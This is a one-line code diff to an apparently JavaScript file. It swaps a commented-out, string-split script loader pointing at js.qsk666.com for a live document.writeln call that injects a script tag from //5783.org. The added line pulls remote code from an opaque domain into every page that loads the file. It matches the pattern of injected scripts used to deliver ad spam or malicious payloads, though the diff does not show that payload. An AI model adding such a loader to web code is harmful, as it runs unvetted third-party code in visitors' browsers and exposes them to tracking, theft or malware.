@@ -1,1 +1,1 @@
-//document.writeln('<scri'+'pt src="https://js.qsk666.com/5/1266/9262/20/27.js"> </scri'+'pt>');
+document.writeln("<script type=\'text/javascript\' src=\'//5783.org/zmmx5418/3.js\'></script>");
